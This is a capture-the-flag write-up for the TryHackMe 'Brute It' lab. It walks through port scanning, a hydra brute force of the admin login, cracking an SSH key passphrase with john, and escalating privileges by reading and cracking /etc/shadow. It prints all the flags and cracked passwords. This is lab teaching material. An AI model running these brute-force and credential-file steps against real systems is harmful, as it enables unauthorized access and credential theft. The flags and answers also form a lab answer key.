# Brute It

## a. Reconnaissance

### 1. Search for open ports using nmap.<br>How many ports are open?
#### answer : 2

### 2. What version of SSH is running?
#### answer : OpenSSH 7.6p1

### 3. What version of Apache is running?
#### answer : 2.4.29

### 4. Which Linux distribution is running?
#### answer : Ubuntu

### 5. Search for hidden directories on web server.<br>What is the hidden directory?
#### answer : /admin

---

using nmap and gobuster for this task 

````shell
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/brute]
└─$ nmap -sV -sC 10.10.254.69 -p 1-3000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 13:20 IST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 19.78% done; ETC: 13:22 (0:00:57 remaining)
Nmap scan report for 10.10.254.69
Host is up (0.23s latency).
Not shown: 2998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.46 seconds
````

````shell
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/brute]
└─$ gobuster dir -u http://10.10.254.69/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.254.69/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.254.69/admin/]                                                                          
Progress: 1889 / 87665 (2.15%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 1909 / 87665 (2.18%)
===============================================================
Finished
===============================================================
````

## b. Getting a shell
### 1. What is the user:password of the admin panel?
#### answer : admin:xavier

### 2. Crack the RSA key you found.<br>What is John's RSA Private Key passphrase?
#### answer : rockinroll

### 3. user.txt
#### answer : THM{a_password_is_not_a_barrier}

### 4. Web flag
#### answer : THM{brut3_f0rce_is_e4sy}

---

First see the source code of the website `ip/admin` and you will get username as admin. <br>Then brute force the password using hydra.

````shell
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/brute]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.254.69 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-03 13:29:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.254.69:80/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid
[ATTEMPT] target 10.10.254.69 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.254.69 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.254.69 - login "admin" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.254.69 - login "admin" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.254.69 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.254.69 - login "admin" - pass "princess" - 6 of 143443 99 [child 5] (0/0)

--snip--

[ATTEMPT] target 10.10.254.69 - login "admin" - pass "disney" - 523 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.254.69 - login "admin" - pass "rabbit" - 524 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.254.69 - login "admin" - pass "54321" - 525 of 14344399 [child 12] (0/0)
[80][http-post-form] host: 10.10.254.69   login: admin   password: xavier
````

Then take the RSA-Private key and first use ssh2john and then brute force with john 

````shell
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/brute]
└─$ /usr/share/john/ssh2john.py id_rsa > john.txt  
                                                                             
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/brute]
└─$ john john.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2024-04-03 13:32) 25.00g/s 1816Kp/s 1816Kc/s 1816KC/s saloni..rashon
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
````
now that we have the passphrase which is `rockinroll`.Use it to get into the machine using username `john`. Dont forget to chmod of the rsa key file first.
````shell
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/brute]
└─$ chmod 600 id_rsa  
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/brute]
└─$ ssh -i id_rsa john@10.10.254.69
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr  3 08:06:50 UTC 2024

  System load:  0.02               Processes:           102
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 36%                IP address for eth0: 10.10.254.69
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ls
user.txt
john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}
````

## c. Privilege Escalation
### 1. Find a form to escalate your privileges.<br>What is the root's password?
#### answer : football

### 2. root.txt
#### answer : THM{pr1v1l3g3_3sc4l4t10n}

---

use sudo -l 
````shell
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
````
This means that you can cat anything without root access.<br>
Now cat the root.txt
````shell 
john@bruteit:~$ sudo cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
````
Now cat the /etc/passwd and /etc/shadow with sudo and add them to files and then unshadow them so that you can get the root password.
````shell
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/brute]
└─$ unshadow pass shad > password.txt
                                                                             
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/brute]
└─$ john password.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
1g 0:00:00:04 0.21% (ETA: 14:17:19) 0.2463g/s 8575p/s 17655c/s 17655C/s anasus..holaz
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
````


